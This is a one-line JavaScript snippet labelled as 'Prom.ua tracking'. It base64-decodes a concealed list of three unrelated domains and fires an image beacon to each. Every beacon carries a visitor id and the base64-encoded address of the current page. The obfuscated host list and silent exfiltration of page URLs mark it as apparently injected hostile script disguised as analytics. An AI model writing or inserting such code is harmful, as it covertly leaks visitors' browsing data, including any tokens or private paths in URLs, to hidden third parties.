/* Prom.ua tracking v1.1.17 */
atob('Y2MubGlua3NhcmUudG9wLGNjLmdpdmVtZWxpbmsuY2MsY2MuY2xvdWRhZC5pY3U=').split(',').forEach((d) => {(window.Image ? (new Image()) : document.createElement('img')).src = 'https://' + d + '/images/tracking.gif?vid=1111994788932894&secondary=1&ref64=' + encodeURIComponent(btoa(window.location.href))});
